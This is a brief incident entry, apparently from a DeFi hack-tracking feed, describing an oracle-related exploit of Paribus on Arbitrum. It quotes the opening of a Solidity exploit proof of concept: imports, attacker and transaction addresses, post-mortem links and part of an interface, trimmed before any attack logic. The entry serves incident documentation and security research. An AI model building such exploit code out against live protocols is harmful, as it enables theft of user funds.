# [?] Paribus - Bad oracle

## Summary
Severity: Unknown
Chain: Arbitrum
Component: Paribus
Published: 2025-01-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~86k

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~86k
// Attacker : https://arbiscan.io/address/0x56190CAC88b8D4b5D5Ed668ef81828913932e7Ed
// Attack Contract : https://arbiscan.io/tx/0x43aa42d2f11afe42832a9619bc8066dfb83a921798b91eaf9d0345dd27dcfb06
// Vulnerable Contract : https://arbiscan.io/address/0xaffd437801434643b734d0b2853654876f66f7d7
// Attack Tx : https://arbiscan.io/tx/0xf5e753d3da60db214f2261343c1e1bc46e674d2fa4b7a953eaf3c52123aeebd2

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xaffd437801434643b734d0b2853654876f66f7d7#code

// @Analysis
// Post-mortem : https://bitfinding.com/blog/paribus-hack-interception
// Twitter Guy : https://x.com/BitFinding/status/1882880682512527516
// Hacking God : 

interface NFTPositionManager {
    function mint(uint256) external;

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function approve(address to, uint256 tokenId) external;

    struct MintParams {
        address token0;
        address token1;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol_
